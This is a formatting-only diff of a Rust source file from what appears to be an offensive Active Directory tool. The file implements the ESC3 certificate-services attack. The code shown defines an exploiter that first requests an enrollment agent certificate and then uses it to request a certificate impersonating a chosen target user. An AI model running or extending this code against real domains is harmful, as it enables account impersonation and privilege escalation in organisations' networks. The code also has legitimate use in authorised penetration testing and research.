@@ -7,8 +7,8 @@
 //!
 //! Reference: SpecterOps "Certified Pre-Owned" — ESC3
 
-use crate::adcs::{IssuedCertificate, create_client_auth_csr, create_esc1_csr};
 use crate::adcs::web_enrollment::WebEnrollmentClient;
+use crate::adcs::{IssuedCertificate, create_client_auth_csr, create_esc1_csr};
 use crate::error::{OverthroneError, Result};
 use tracing::info;
 
@@ -25,12 +25,12 @@ impl Esc3Exploiter {
     }
 
     /// Execute ESC3 two-step attack
-    /// 
+    ///
     /// # Arguments
     /// * `agent_template` - Template name for enrollment agent certificate
     /// * `target_template` - Template name for target user certificate
     /// * `target_user` - Target user UPN to impersonate
-    /// 
+    ///
     /// # Returns
     /// * `Ok((agent_cert, user_cert))` - Both certificates
     /// * `Err(OverthroneError)` - If the attack fails
@@ -47,7 +47,7 @@ impl Esc3Exploiter {
 
         // Step 1: Request enrollment agent certificate
         let agent_cert = self.request_agent_cert(agent_template).await?;
-        
+
         info!("Enrollment agent certificate obtained");
 
         // Step 2: Use agent cert to request user certificate
@@ -60,8 +60,7 @@ impl Esc3Exploiter {
 
     /// Request enrollment agent certificate
     async fn request_agent_cert(&self, template: &str) -> Result<IssuedCertificate> {
-        let (agent_csr, agent_key) =
-            create_client_auth_csr("EnrollmentAgent", template, None)?;
+        let (agent_csr, agent_key) = create_client_auth_csr("EnrollmentAgent", template, None)?;
 
         let agent_response = self
             .web_client
@@ -104,7 +103,10 @@ impl Esc3Exploiter {
         template: &str,
         target_user: &str,
     ) -> Result<IssuedCertificate> {
-        info!("Requesting certificate for {} using enrollment agent", target_user);
+        info!(
+            "Requesting certificate for {} using enrollment agent",
+            target_user
+        );
 
         // Create CSR for target user
         let (target_csr, target_key) = create_esc1_csr(target_user, target_user, template)?;
